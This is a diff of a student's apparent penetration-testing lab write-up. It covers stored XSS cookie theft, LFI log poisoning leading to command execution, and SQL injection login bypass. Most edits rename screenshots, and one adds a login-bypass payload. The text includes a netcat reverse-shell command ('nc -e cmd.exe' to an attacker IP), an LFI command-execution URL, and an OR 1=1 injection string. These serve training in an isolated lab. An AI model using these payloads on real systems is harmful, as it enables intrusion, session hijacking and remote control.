@@ -32,7 +32,7 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 - To test the validity of the XSS we then run the powershell script on the Windows machine
 - We can see that the cookie was set to our listener, enabling us to adjust our cookie and hijack the admin's session
 ![[cookie_steal.png]]
-![[Screenshot_2022-06-09-05-57-22_1292x560 2.png]]
+![[session_hijack.png]]
 2.  Consider what other ways an XSS vulnerability in this application might be used for attacks.
 As this is a stored XSS there are numerous possible ways to exploit this XSS which would have severe implications on the server and its user's. Examples could include anything from defacing the web application to account compromise.
 
@@ -68,7 +68,7 @@ Here we can see the command being injected into this log file.
 ![[log_poisoning.png]]
 - We then simply navigate to the vulnerable log file and call our newly injected function
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
-![[Screenshot_2022-06-09-07-24-43_1460x868.png]]
+![[lfi_log_ipconfig.png]]
 2.  Use the code execution to obtain a full shell.
 We can simply alter our URL to execute the following command:
 `nc -e cmd.exe 192.168.119.231 9001`
@@ -119,7 +119,8 @@ We can see that the malicious query is returning all user data, indicating that 
 ![[mariadb_query.png]]
 
 2.  SQL inject the username field to bypass the login process.
-
+A fairly similar username of "tom ' OR 1=1;#'" will bypass the login functionality.
+![[Screenshot_2022-06-10-09-40-08_508x384.png]]
 3.  Why is the username displayed like it is in the web application once the authentication process is bypassed?
 
 4.  Execute the SQL injection in the password field. Is the "LIMIT 1" necessary in the payload? Why or why not?
